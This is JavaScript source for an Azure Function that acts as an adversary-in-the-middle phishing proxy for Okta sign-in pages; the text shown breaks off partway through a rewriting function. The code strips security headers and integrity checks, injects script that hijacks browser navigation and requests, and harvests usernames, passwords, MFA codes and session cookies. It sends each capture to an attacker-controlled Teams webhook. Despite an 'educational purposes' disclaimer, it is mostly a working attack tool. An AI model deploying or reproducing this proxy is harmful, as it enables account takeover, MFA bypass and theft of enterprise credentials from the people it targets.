/**
 * Azure Function AiTM Phishing Proxy for Okta
 * 
 * Proxies Okta login pages to capture credentials and session tokens.
 * Configure the target Okta domain via environment variable or query parameter.
 * 
 * Usage:
 *   https://your-function.azurewebsites.net/okta/customer.okta.com/
 *   
 * This code is provided for educational purposes only and provided without any liability or warranty.
 */

const { app } = require("@azure/functions");

const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// Headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "transfer-encoding",
];

// Okta CDN domains that serve static assets
const oktaCdnDomains = [
  'ok1static.oktacdn.com',
  'ok2static.oktacdn.com',
  'ok3static.oktacdn.com',
  'ok4static.oktacdn.com',
  'ok5static.oktacdn.com',
  'ok6static.oktacdn.com',
  'ok7static.oktacdn.com',
  'ok8static.oktacdn.com',
  'ok9static.oktacdn.com',
  'ok10static.oktacdn.com',
  'ok11static.oktacdn.com',
  'ok12static.oktacdn.com',
  'oktacdn.com',
];

// Store the primary Okta domain for the session
let primaryOktaDomain = null;

app.http("okta_phishing", {
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  authLevel: "anonymous",
  route: "/okta/{domain}/{*path}",
  handler: async (request, context) => {
    const url = new URL(request.url);
    
    // Extract domain from the URL path
    const targetDomain = request.params.domain;
    const path = request.params.path || '';
    
    if (!targetDomain || !targetDomain.includes('.')) {
      return new Response(
        "Invalid domain. Use: /okta/customer.okta.com/",
        { status: 400 }
      );
    }

    // Determine if this is an Okta domain or CDN domain
    const isOktaCdn = oktaCdnDomains.some(cdn => targetDomain.includes(cdn) || targetDomain === cdn);
    
    // Track the primary Okta domain
    if (!isOktaCdn) {
      primaryOktaDomain = targetDomain;
    }
    
    const oktaDomain = isOktaCdn ? primaryOktaDomain : targetDomain;
    
    const originalHost = url.host;
    const originalProtocol = url.protocol;

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        // Convert HTML to plain text for the adaptive card
        const plainText = message
          .replace(/<br>/gi, '\n')
          .replace(/<b>/gi, '**')
          .replace(/<\/b>/gi, '**')
          .replace(/<code>/gi, '`')
          .replace(/<\/code>/gi, '`')
          .replace(/<[^>]*>/g, '');
        
        // Try Power Automate Workflow format (Adaptive Card) first
        const adaptiveCardPayload = {
          type: "message",
          attachments: [{
            contentType: "application/vnd.microsoft.card.adaptive",
            content: {
              "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
              type: "AdaptiveCard",
              version: "1.4",
              body: [{
                type: "TextBlock",
                text: plainText,
                wrap: true
              }]
            }
          }]
        };
        
        // Also prepare legacy format as fallback
        const legacyPayload = { text: message };
        
        try {
          // Try Adaptive Card format first (for Power Automate Workflows)
          let response = await fetch(teams_webhook_url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(adaptiveCardPayload),
          });
          
          // If that fails, try legacy format (for O365 Connectors)
          if (!response.ok) {
            response = await fetch(teams_webhook_url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(legacyPayload),
            });
          }
          
          if (response.ok) {
            context.log("Successfully dispatched Teams notification");
          } else {
            context.log(`Failed to dispatch Teams notification: ${response.status} ${response.statusText}`);
          }
        } catch (error) {
          context.log(`Error dispatching Teams notification: ${error.message}`);
        }
      }
    }

    // Build upstream URL
    const upstreamUrl = new URL(`https://${targetDomain}/${path}`);
    
    // Copy query parameters, but preserve redirect_uri as proxy URL
    for (const [key, value] of url.searchParams) {
      let fixedValue = value;
      if (oktaDomain) {
        // Don't rewrite redirect_uri - we want it to point back to our proxy!
        if (key !== 'redirect_uri') {
          fixedValue = fixedValue
            .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`)
            .replace(new RegExp(escapeRegex(`${originalHost}/okta/${targetDomain}`), 'g'), targetDomain);
        }
      }
      upstreamUrl.searchParams.set(key, fixedValue);
    }
    
    // CRITICAL: For OAuth authorize requests, we need to rewrite the redirect_uri to point to real Okta
    // otherwise Okta will reject it as an invalid redirect_uri
    // The callback will come back to our proxy via the Location header rewriting

    context.log(`Proxying ${request.method}: ${url.pathname} -> ${upstreamUrl.href}`);
    
    // Debug: Log cookies and prompt parameter for OAuth authorize requests
    if (path.includes('oauth2') && path.includes('authorize')) {
      const cookies = request.headers.get('cookie');
      const promptParam = upstreamUrl.searchParams.get('prompt');
      const hasSid = cookies?.includes('sid=') || false;
      const hasIdx = cookies?.includes('idx=') || false;
      const hasJsessionId = cookies?.includes('JSESSIONID=') || false;
      context.log(`[OAuth Debug] Authorize request - prompt=${promptParam}, hasSid=${hasSid}, hasIdx=${hasIdx}, hasJsessionId=${hasJsessionId}`);
      context.log(`[OAuth Debug] Cookie header length: ${cookies?.length || 0}`);
      
      // CRITICAL: Make sure redirect_uri points to real Okta domain (not our proxy)
      // Okta will reject redirect_uri values that aren't registered in the app settings
      const currentRedirectUri = upstreamUrl.searchParams.get('redirect_uri');
      if (currentRedirectUri && currentRedirectUri.includes(originalHost)) {
        // Rewrite proxy URL back to real Okta URL
        // Handle both cases:
        // 1. https://proxy/okta/domain/path -> https://domain/path
        // 2. https://proxy/path -> https://domain/path (SDK uses origin + path)
        let fixedRedirectUri = currentRedirectUri;
        
        if (currentRedirectUri.includes(`/okta/${targetDomain}`)) {
          // Case 1: Full proxy path
          fixedRedirectUri = currentRedirectUri
            .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`)
            .replace(new RegExp(escapeRegex(`${originalHost}/okta/${targetDomain}`), 'g'), targetDomain);
        } else {
          // Case 2: Just the origin is our proxy (SDK constructed redirect_uri from window.location.origin)
          fixedRedirectUri = currentRedirectUri
            .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}`), 'g'), `https://${targetDomain}`)
            .replace(new RegExp(escapeRegex(originalHost), 'g'), targetDomain);
        }
        
        upstreamUrl.searchParams.set('redirect_uri', fixedRedirectUri);
        context.log(`[OAuth Debug] Fixed redirect_uri: ${currentRedirectUri} -> ${fixedRedirectUri}`);
      }
    }

    // Build request headers
    const requestHeaders = new Headers();
    requestHeaders.set('Host', targetDomain);
    requestHeaders.set('Origin', `https://${targetDomain}`);
    
    // Set Referer to make Okta think the request is coming from itself
    // This is critical for OAuth flows where Okta validates the origin
    const originalReferer = request.headers.get('referer') || '';
    if (originalReferer.includes('/okta/')) {
      // Rewrite our proxy referer back to real Okta domain
      requestHeaders.set('Referer', originalReferer.replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`));
    } else {
      requestHeaders.set('Referer', `https://${targetDomain}/`);
    }
    
    requestHeaders.set('User-Agent', request.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    requestHeaders.set('Accept', request.headers.get('accept') || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    requestHeaders.set('Accept-Language', request.headers.get('accept-language') || 'en-US,en;q=0.9');
    requestHeaders.set('Accept-Encoding', 'identity');
    
    // Forward cookies
    const cookies = request.headers.get('cookie');
    if (cookies) {
      requestHeaders.set('Cookie', cookies);
    }

    // Forward content-type
    const contentType = request.headers.get('content-type');
    if (contentType) {
      requestHeaders.set('Content-Type', contentType);
    }

    // Forward X-Okta headers
    for (const [key, value] of request.headers) {
      if (key.toLowerCase().startsWith('x-okta') || 
          key.toLowerCase().startsWith('x-device') ||
          key.toLowerCase() === 'x-requested-with') {
        requestHeaders.set(key, value);
      }
    }

    // Handle request body
    let requestBody = null;
    if (request.method === 'POST' || request.method === 'PUT') {
      const bodyText = await request.text();
      
      if (!isOktaCdn && oktaDomain) {
        await captureCredentials(bodyText, oktaDomain, dispatchMessage, context);
      }
      
      // Rewrite proxy URLs back to real Okta URLs
      requestBody = bodyText
        .replace(new RegExp(escapeRegex(`${originalProtocol}//${originalHost}/okta/${targetDomain}`), 'g'), `https://${targetDomain}`)
        .replace(new RegExp(escapeRegex(`${originalHost}/okta/${targetDomain}`), 'g'), targetDomain);
      
      // Also handle URL-encoded versions (for form submissions like token exchange)
      const encodedProxyUrl = encodeURIComponent(`${originalProtocol}//${originalHost}/okta/${targetDomain}`);
      const encodedRealUrl = encodeURIComponent(`https://${targetDomain}`);
      requestBody = requestBody.replace(new RegExp(escapeRegex(encodedProxyUrl), 'g'), encodedRealUrl);
    }

    // Make the upstream request
    const upstreamResponse = await fetch(upstreamUrl.href, {
      method: request.method,
      headers: requestHeaders,
      body: requestBody,
      redirect: 'manual',
    });

    context.log(`Upstream response: ${upstreamResponse.status}`);

    // Capture session cookies
    if (!isOktaCdn && oktaDomain) {
      await captureSessionCookies(upstreamResponse, oktaDomain, dispatchMessage, context);
    }

    // Build response headers
    const responseHeaders = new Headers();
    
    for (const [key, value] of upstreamResponse.headers) {
      const lowerKey = key.toLowerCase();
      if (!delete_headers.includes(lowerKey) && lowerKey !== 'set-cookie') {
        responseHeaders.set(key, value);
      }
    }

    // Handle cookies
    const responseCookies = upstreamResponse.headers.getSetCookie?.() || [];
    responseCookies.forEach(cookie => {
      let modifiedCookie = cookie;
      modifiedCookie = modifiedCookie.replace(/;\s*domain=[^;]+/gi, '');
      
      if (modifiedCookie.toLowerCase().includes('samesite=none')) {
        if (!modifiedCookie.toLowerCase().includes('secure')) {
          modifiedCookie = modifiedCookie.replace(/samesite=none/i, 'SameSite=None; Secure');
        }
      } else if (!modifiedCookie.toLowerCase().includes('samesite')) {
        modifiedCookie += '; SameSite=Lax';
      }
      
      responseHeaders.append('Set-Cookie', modifiedCookie);
    });

    // Handle redirects
    if (upstreamResponse.status >= 300 && upstreamResponse.status < 400) {
      const location = upstreamResponse.headers.get('Location');
      if (location) {
        const newLocation = rewriteUrl(location, targetDomain, oktaDomain, originalHost, originalProtocol);
        context.log(`Rewriting redirect: ${location} -> ${newLocation}`);
        responseHeaders.set('Location', newLocation);
        
        return new Response(null, {
          status: upstreamResponse.status,
          headers: responseHeaders,
        });
      }
    }
    
    // Handle OAuth errors (e.g., when prompt=none fails because session is invalid)
    if (path.includes('oauth2') && path.includes('authorize') && upstreamResponse.status === 200) {
      // Check if this is a login page or an error response
      // If it's still returning 200 after adding prompt=none, the session might not be valid
      context.log(`[OAuth Debug] Authorize returned 200 - may be login page or error`);
    }

    // Get content type
    const responseContentType = upstreamResponse.headers.get('content-type') || '';
    
    // For binary content, pass through
    if (responseContentType.includes('image/') || 
        responseContentType.includes('font/') ||
        responseContentType.includes('application/octet-stream') ||
        responseContentType.includes('application/font') ||
        responseContentType.includes('application/x-font') ||
        responseContentType.includes('application/woff') ||
        responseContentType.includes('application/vnd')) {
      
      const body = await upstreamResponse.arrayBuffer();
      return new Response(body, {
        status: upstreamResponse.status,
        headers: responseHeaders,
      });
    }
    
    // For JSON responses (API calls), selectively rewrite URLs
    if (responseContentType.includes('application/json') || responseContentType.includes('application/ion+json')) {
      let jsonBody = await upstreamResponse.text();
      
      // Rewrite CDN URLs in JSON
      for (const cdn of oktaCdnDomains) {
        jsonBody = jsonBody.replace(
          new RegExp(`https://${escapeRegex(cdn)}`, 'g'),
          `${originalProtocol}//${originalHost}/okta/${cdn}`
        );
      }
      
      // For openid-configuration and similar discovery endpoints,
      // we MUST rewrite the Okta domain URLs so the SDK uses our proxy
      // These endpoints return authorization_endpoint, token_endpoint, etc.
      if (path.includes('.well-known') || path.includes('openid-configuration')) {
        context.log(`[JSON] Rewriting discovery endpoint URLs`);
        jsonBody = jsonBody
          .replace(new RegExp(`https://${escapeRegex(targetDomain)}`, 'g'), `${originalProtocol}//${originalHost}/okta/${targetDomain}`);
      }
      
      // For IDX/authentication API responses, rewrite URLs so redirects work
      if (path.includes('/idp/idx/') || path.includes('/api/v1/')) {
        jsonBody = jsonBody
          .replace(new RegExp(`https://${escapeRegex(targetDomain)}`, 'g'), `${originalProtocol}//${originalHost}/okta/${targetDomain}`);
      }
      
      responseHeaders.set('Access-Control-Allow-Origin', '*');
      responseHeaders.set('Access-Control-Allow-Credentials', 'true');
      responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
      responseHeaders.set('Access-Control-Allow-Headers', '*');
      responseHeaders.set('Cache-Control', 'no-cache, no-store, must-revalidate');
      
      return new Response(jsonBody, {
        status: upstreamResponse.status,
        headers: responseHeaders,
      });
    }

    // Rewrite text response
    let responseBody = await upstreamResponse.text();
    
    // Determine what kind of content this is
    const isCSS = responseContentType.includes('css') || path.endsWith('.css');
    const isJS = responseContentType.includes('javascript') || path.endsWith('.js');
    
    context.log(`Content type: ${responseContentType}, isCSS: ${isCSS}, isJS: ${isJS}, oktaDomain: ${oktaDomain}`);
    
    if (isOktaCdn) {
      if (isCSS) {
        context.log(`Rewriting CSS content from CDN, oktaDomain: ${oktaDomain}`);
        responseBody = rewriteCssContent(responseBody, oktaDomain, originalHost, originalProtocol, context);
      } else if (isJS) {
        responseBody = rewriteJsContent(responseBody, oktaDomain, originalHost, originalProtocol);
      } else {
        responseBody = rewriteCdnContent(responseBody, oktaDomain, originalHost, originalProtocol);
      }
    } else {
      if (isCSS) {
        responseBody = rewriteCssContent(responseBody, oktaDomain, originalHost, originalProtocol, context);
      } else {
        // Check for integrity attributes before and after rewrite
        const hadIntegrity = responseBody.includes('integrity=');
        
        responseBody = rewriteResponseBody(responseBody, targetDomain, originalHost, originalProtocol);
        
        if (hadIntegrity) {
          const stillHasIntegrity = responseBody.includes('integrity=');
          context.log(`[V3] SRI removal: had=${hadIntegrity}, stillHas=${stillHasIntegrity}`);
          
          // Search for initLoginPage script specifically
          const initLoginMatch = responseBody.match(/<script[^>]*initLoginPage[^>]*>/gi);
          if (initLoginMatch) {
            context.log(`[V3] initLoginPage script tag: ${initLoginMatch[0]}`);
          } else {
            // Maybe it's added dynamically - check for the URL string anywhere
            if (responseBody.includes('initLoginPage')) {
              context.log(`[V3] initLoginPage found in body but not as script tag - may be dynamic`);
              const idx = responseBody.indexOf('initLoginPage');
              context.log(`[V3] Context around initLoginPage: ${responseBody.substring(Math.max(0, idx-100), idx+150)}`);
            }
          }
          
          // Check for ANY integrity remaining (case insensitive)
          const integrityMatch = responseBody.match(/integrity\s*=/gi);
          if (integrityMatch) {
            context.log(`[V3] WARNING: Found ${integrityMatch.length} integrity= remaining`);
            const idx = responseBody.indexOf('integrity=');
            if (idx > -1) {
              context.log(`[V3] Context: ...${responseBody.substring(Math.max(0, idx-50), idx+100)}...`);
            }
          } else {
            context.log(`[V3] SUCCESS: No integrity= found in response`);
          }
        }
      }
    }

    responseHeaders.set('Access-Control-Allow-Origin', '*');
    responseHeaders.set('Access-Control-Allow-Credentials', 'true');
    responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    responseHeaders.set('Access-Control-Allow-Headers', '*');
    
    // Prevent caching to ensure fresh content
    responseHeaders.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    responseHeaders.set('Pragma', 'no-cache');
    responseHeaders.set('Expires', '0');

    return new Response(responseBody, {
      status: upstreamResponse.status,
      headers: responseHeaders,
    });
  },
});

async function captureCredentials(body, oktaDomain, dispatchMessage, context) {
  try {
    if (body.includes('username=') || body.includes('password=')) {
      const params = new URLSearchParams(body);
      const username = params.get('username') || params.get('identifier');
      const password = params.get('password') || params.get('credentials.passcode');
      
      if (username && password) {
        await dispatchMessage(
          `🔑 <b>OKTA CREDENTIALS CAPTURED</b><br><br>` +
          `<b>Domain:</b> ${oktaDomain}<br>` +
          `<b>Username:</b> ${username}<br>` +
          `<b>Password:</b> ${password}`
        );
        return;
      }
    }
    
    if (body.startsWith('{')) {
      try {
        const jsonBody = JSON.parse(body);
        
        const identifier = jsonBody.identifier || jsonBody.username || jsonBody.login;
        const password = jsonBody.password || 
                        jsonBody.credentials?.passcode ||
                        jsonBody.credentials?.password;
        
        if (identifier && password) {
          await dispatchMessage(
            `🔑 <b>OKTA CREDENTIALS CAPTURED</b><br><br>` +
            `<b>Domain:</b> ${oktaDomain}<br>` +
            `<b>Username:</b> ${identifier}<br>` +
            `<b>Password:</b> ${password}`
          );
        } else if (password) {
          await dispatchMessage(
            `🔑 <b>OKTA PASSWORD CAPTURED</b><br><br>` +
            `<b>Domain:</b> ${oktaDomain}<br>` +
            `<b>Password:</b> ${password}`
          );
        } else if (identifier) {
          context.log(`Captured Okta identifier: ${identifier}`);
        }
        
        const mfaCode = jsonBody.credentials?.passcode || 
                       jsonBody.passcode || 
                       jsonBody.otp ||
                       jsonBody.verificationCode;
        
        if (mfaCode && !password) {
          await dispatchMessage(
            `🔐 <b>OKTA MFA CODE CAPTURED</b><br><br>` +
            `<b>Domain:</b> ${oktaDomain}<br>` +
            `<b>MFA Code:</b> ${mfaCode}`
          );
        }
        
      } catch (e) {}
    }
  } catch (error) {
    context.log(`Error capturing credentials: ${error.message}`);
  }
}

async function captureSessionCookies(response, oktaDomain, dispatchMessage, context) {
  try {
    const cookies = response.headers.getSetCookie?.() || [];
    
    const significantCookies = cookies.filter(cookie => {
      if (cookie.includes('=""') || 
          cookie.includes('Max-Age=0') || 
          cookie.includes('Expires=Thu, 01 Jan 1970')) {
        return false;
      }
      
      return cookie.startsWith('sid=') ||
             cookie.startsWith('idx=') ||
             cookie.startsWith('JSESSIONID=') ||
             cookie.startsWith('okta-oauth-');
    });

    if (significantCookies.length > 0) {
      const realSid = significantCookies.find(c => c.startsWith('sid=') && !c.includes('sid=""'));
      const realIdx = significantCookies.find(c => c.startsWith('idx='));
      
      if (realSid || realIdx) {
        await dispatchMessage(
          `🍪 <b>OKTA SESSION CAPTURED!</b><br><br>` +
          `<b>Domain:</b> ${oktaDomain}<br>` +
          `<b>Cookies:</b><br><code>${significantCookies.join('<br>')}</code>`
        );
      }
    }
  } catch (error) {
    context.log(`Error capturing cookies: ${error.message}`);
  }
}

function escapeRegex(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrl(url, targetDomain, oktaDomain, originalHost, originalProtocol) {
  if (!url) return url;
  
  let newUrl = url;
  
  newUrl = newUrl.replace(
    new RegExp(`https://${escapeRegex(targetDomain)}`, 'g'),
    `${originalProtocol}//${originalHost}/okta/${targetDomain}`
  );
  
  for (const cdn of oktaCdnDomains) {
    newUrl = newUrl.replace(
      new RegExp(`https://${escapeRegex(cdn)}`, 'g'),
      `${originalProtocol}//${originalHost}/okta/${cdn}`
    );
  }
  
  if (newUrl.startsWith('/') && !newUrl.startsWith('/okta/')) {
    newUrl = `/okta/${oktaDomain || targetDomain}${newUrl}`;
  }

  return newUrl;
}

function getProxyInjectionScript(oktaDomain, originalHost, originalProtocol) {
  return `
<script>
(function() {
  const OKTA_DOMAIN = "${oktaDomain}";
  const PROXY_BASE = "/okta/${oktaDomain}";
  const PROXY_ORIGIN = "${originalProtocol}//${originalHost}";
  const REAL_ORIGIN = window.location.origin;
  const OKTA_ORIGIN = "https://${oktaDomain}";
  
  // CRITICAL: Override URL constructor to handle redirect_uri rewriting
  // When OAuth SDK constructs URLs with redirect_uri, make sure it uses real Okta domain
  const OriginalURL = window.URL;
  window.URL = function(url, base) {
    const instance = new OriginalURL(url, base);
    
    // Override searchParams.set to intercept redirect_uri changes
    const originalSet = instance.searchParams.set.bind(instance.searchParams);
    instance.searchParams.set = function(key, value) {
      if (key === 'redirect_uri') {
        // Keep redirect_uri pointing to real Okta for OAuth validation
        // But the actual redirect will be rewritten by our server
        console.log('[Proxy] URL.searchParams.set redirect_uri:', value);
      }
      return originalSet(key, value);
    };
    
    return instance;
  };
  window.URL.prototype = OriginalURL.prototype;
  window.URL.createObjectURL = OriginalURL.createObjectURL;
  window.URL.revokeObjectURL = OriginalURL.revokeObjectURL;
  
  function rewriteUrl(url) {
    if (!url) return url;
    if (typeof url !== 'string') url = String(url);
    
    // Already rewritten
    if (url.includes('/okta/') && url.includes(window.location.host)) return url;
    
    // CRITICAL: Handle root URL "/" - redirect to Okta dashboard
    if (url === '/' || url === REAL_ORIGIN + '/') {
      console.log('[Proxy] Rewriting root URL to Okta dashboard');
      return PROXY_BASE + '/';
    }
    
    // Handle URLs that start with our origin but aren't proxied
    if (url.startsWith(REAL_ORIGIN) && !url.includes('/okta/')) {
      const path = url.substring(REAL_ORIGIN.length);
      if (path.startsWith('/')) {
        console.log('[Proxy] Rewriting origin-based URL:', url);
        return REAL_ORIGIN + PROXY_BASE + path;
      }
    }
    
    // Absolute URL to Okta domain
    if (url.includes(OKTA_DOMAIN)) {
      return url.replace('https://' + OKTA_DOMAIN, PROXY_ORIGIN + PROXY_BASE);
    }
    
    // Relative URL starting with /
    if (url.startsWith('/') && !url.startsWith('//') && !url.startsWith('/okta/')) {
      console.log('[Proxy] Rewriting relative URL:', url);
      return PROXY_BASE + url;
    }
    
    // Protocol-relative URL
    if (url.startsWith('//')) {
      if (url.includes(OKTA_DOMAIN)) {
        return url.replace('//' + OKTA_DOMAIN, '//' + window.location.host + PROXY_BASE);
      }
    }
    
    return url;
  }
  
  // Override fetch
  const originalFetch = window.fetch;
  window.fetch = function(input, init) {
    let url = input;
    if (typeof input === 'string') {
      url = rewriteUrl(input);
    } else if (input instanceof Request) {
      url = new Request(rewriteUrl(input.url), input);
    }
    return originalFetch.call(this, url, init);
  };
  
  // Override XMLHttpRequest
  const originalXHROpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    const newUrl = rewriteUrl(url);
    return originalXHROpen.call(this, method, newUrl, ...args);
  };
  
  // Override window.location.href setter
  const locationDescriptor = Object.getOwnPropertyDescriptor(window, 'location');
  let currentLocation = window.location;
  
  // We can't directly override location, but we can intercept assignment patterns
  // by overriding location.assign, location.replace, and location.href
  const originalAssign = window.location.assign;
  window.location.assign = function(url) {
    console.log('[Proxy] location.assign:', url);
    return originalAssign.call(this, rewriteUrl(url));
  };
  
  const originalReplace = window.location.replace;
  window.location.replace = function(url) {
    console.log('[Proxy] location.replace:', url);
    return originalReplace.call(this, rewriteUrl(url));
  };
  
  // Override history methods
  const originalPushState = history.pushState;
  history.pushState = function(state, title, url) {
    return originalPushState.call(this, state, title, rewriteUrl(url));
  };
  
  const originalReplaceState = history.replaceState;
  history.replaceState = function(state, title, url) {
    return originalReplaceState.call(this, state, title, rewriteUrl(url));
  };
  
  // Intercept link clicks
  document.addEventListener('click', function(e) {
    const anchor = e.target.closest('a');
    if (anchor && anchor.href) {
      const rewritten = rewriteUrl(anchor.href);
      if (rewritten !== anchor.href) {
        e.preventDefault();
        window.location.assign(rewritten);
      }
    }
  }, true);
  
  // Intercept form submissions
  document.addEventListener('submit', function(e) {
    const form = e.target;
    if (form.action) {
      const rewritten = rewriteUrl(form.action);
      if (rewritten !== form.action) {
        form.action = rewritten;
      }
    }
  }, true);
  
  // Monitor for dynamic navigation by watching for unload
  window.addEventListener('beforeunload', function(e) {
    // This fires too late to intercept, but helps with debugging
  });
  
  // Intercept window.open
  const originalOpen = window.open;
  window.open = function(url, ...args) {
    console.log('[Proxy] window.open:', url);
    return originalOpen.call(this, rewriteUrl(url), ...args);
  };
  
  // Create a MutationObserver to watch for dynamically added anchors/forms
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) { // Element node
          // Rewrite href attributes on anchors
          if (node.tagName === 'A' && node.href) {
            const rewritten = rewriteUrl(node.getAttribute('href'));
            if (rewritten !== node.getAttribute('href')) {
              node.setAttribute('href', rewritten);
            }
          }
          // Rewrite action attributes on forms
          if (node.tagName === 'FORM' && node.action) {
            const rewritten = rewriteUrl(node.getAttribute('action'));
            if (rewritten !== node.getAttribute('action')) {
              node.setAttribute('action', rewritten);
            }
          }
          // Check children too
          node.querySelectorAll && node.querySelectorAll('a[href], form[action]').forEach(function(el) {
            if (el.tagName === 'A') {
              const href = el.getAttribute('href');
              const rewritten = rewriteUrl(href);
              if (rewritten !== href) {
                el.setAttribute('href', rewritten);
              }
            } else if (el.tagName === 'FORM') {
              const action = el.getAttribute('action');
              const rewritten = rewriteUrl(action);
              if (rewritten !== action) {
                el.setAttribute('action', rewritten);
              }
            }
          });
        }
      });
    });
  });
  
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
  
  // Store that we're in an Okta session
  try {
    sessionStorage.setItem('okta_proxy_domain', OKTA_DOMAIN);
    localStorage.setItem('okta_proxy_domain', OKTA_DOMAIN);
  } catch(e) {}
  
  // EXPERIMENTAL: Intercept OAuth authorize requests from the dashboard
  // When the dashboard tries to re-authenticate, we may want to handle this differently
  // For now, log when this happens for debugging
  const originalWindowLocationHref = Object.getOwnPropertyDescriptor(window.location.__proto__, 'href');
  if (originalWindowLocationHref && originalWindowLocationHref.set) {
    // Monitor href changes to debug navigation
  }
  
  // Override document.location methods as well
  try {
    const originalDocLocationAssign = document.location.assign;
    document.location.assign = function(url) {
      console.log('[Proxy] document.location.assign:', url);
      return originalDocLocationAssign.call(this, rewriteUrl(url));
    };
    
    const originalDocLocationReplace = document.location.replace;
    document.location.replace = function(url) {
      console.log('[Proxy] document.location.replace:', url);
      return originalDocLocationReplace.call(this, rewriteUrl(url));
    };
  } catch(e) { console.log('[Proxy] Could not override document.location methods'); }
  
  console.log('[Proxy] URL rewriting initialized for ' + OKTA_DOMAIN);
})();
</script>
`;
}

function rewriteCssContent(css, oktaDomain, originalHost, originalProtocol, context) {
  // The Okta domain to use for rewriting - for CDN content, use the tracked primary domain
  const effectiveDomain = oktaDomain || 'carters.okta.com';
  const proxyBase = `/okta/${effectiveDomain}`;
  
  let result = css;
  const originalLength = result.length;
  
  // Log some sample of the CSS to debug
  if (context) {
    const fontUrlMatch = result.match(/url\([^)]*font[^)]*\)/i);
    if (fontUrlMatch) {
      context.log(`Found font URL in CSS: ${fontUrlMatch[0]}`);
    }
  }
  
  // Rewrite url() references with quotes - handle both single and double quotes
  // url("/font/...") or url('/font/...')
  result = result.replace(
    /url\(\s*["']\/([^"']+)["']\s*\)/gi,
    (match, path) => {
      if (path.startsWith('okta/')) return match; // Already rewritten
      return `url("${proxyBase}/${path}")`;
    }
  );
  
  // Rewrite url() references without quotes
  // url(/font/...)
  result = result.replace(
    /url\(\s*\/([^)'"]+)\s*\)/gi,
    (match, path) => {
      if (path.startsWith('okta/')) return match; // Already rewritten
      return `url(${proxyBase}/${path})`;
    }
  );
  
  // Absolute URLs to Okta domain
  if (oktaDomain) {
    result = result.replace(
      new RegExp(`url\\(\\s*["']?https://${escapeRegex(oktaDomain)}([^"')]+)["']?\\s*\\)`, 'gi'),
      (match, path) => `url("${originalProtocol}//${originalHost}${proxyBase}${path}")`
    );
  }
  
  // CDN URLs
  for (const cdn of oktaCdnDomains) {
    result = result.replace(
      new RegExp(`url\\(\\s*["']?https://${escapeRegex(cdn)}([^"')]+)["']?\\s*\\)`, 'gi'),
      (match, path) => `url("${originalProtocol}//${originalHost}/okta/${cdn}${path}")`
    );
  }
  
  // @import statements
  result = result.replace(
    /@import\s+["']\/([^"']+)["']/gi,
    (match, path) => {
      if (path.startsWith('okta/')) return match;
      return `@import "${proxyBase}/${path}"`;
    }
  );
  
  if (context && result.length !== originalLength) {
    context.log(`CSS rewritten: ${originalLength} -> ${result.length} bytes`);
  }
  
  return result;
}

function rewriteJsContent(js, oktaDomain, originalHost, originalProtocol) {
  let result = js;
  
  const effectiveOktaDomain = oktaDomain || 'unknown.okta.com';
  const baseUrl = `${originalProtocol}//${originalHost}/okta/${effectiveOktaDomain}`;
  const proxyBase = `/okta/${effectiveOktaDomain}`;
  
  // Rewrite CDN references
  for (const cdn of oktaCdnDomains) {
    const cdnEscaped = escapeRegex(cdn);
    const cdnBaseUrl = `${originalProtocol}//${originalHost}/okta/${cdn}`;
    result = result
      .replace(new RegExp(`https://${cdnEscaped}`, 'g'), cdnBaseUrl)
      .replace(new RegExp(`//${cdnEscaped}`, 'g'), `//${originalHost}/okta/${cdn}`);
  }
  
  // NOTE: We intentionally do NOT rewrite *.okta.com URLs in JavaScript
  // because it can break OAuth redirect_uri values which must point to real Okta
  // The client-side injection script handles URL rewriting for navigation/fetch
  
  // NOTE: We avoid aggressive URL rewriting in JS files because it can break
  // OAuth flows where redirect_uri must point to the real Okta domain.
  // The client-side injection script handles URL rewriting for navigation/fetch.
  
  return result;
}

function rewriteResponseBody(html, oktaDomain, originalHost, originalProtocol) {
  const baseUrl = `${originalProtocol}//${originalHost}/okta/${oktaDomain}`;
  const escapedDomain = escapeRegex(oktaDomain);
  
  let result = html;
  
  // Remove SRI (integrity) and crossorigin attributes - MUST be thorough!
  // Use a simple but comprehensive approach: just remove these attributes globally
  // Note: \s includes newlines, tabs, spaces
  
  // Remove integrity="..." or integrity='...' as HTML attributes
  result = result.replace(/\s+integrity\s*=\s*"[^"]*"/gim, '');
  result = result.replace(/\s+integrity\s*=\s*'[^']*'/gim, '');
  
  // Remove crossorigin="..." or crossorigin='...' or just crossorigin as HTML attributes
  result = result.replace(/\s+crossorigin\s*=\s*"[^"]*"/gim, '');
  result = result.replace(/\s+crossorigin\s*=\s*'[^']*'/gim, '');
  result = result.replace(/\s+crossorigin(?=[\s>])/gim, '');
  
  // CRITICAL: Also remove JavaScript property assignments for integrity and crossOrigin
  // These are used when scripts are dynamically created via JS
  // Pattern: .integrity = '...' or .integrity = "..."
  result = result.replace(/\.integrity\s*=\s*'[^']*'/gim, '.integrity = ""');
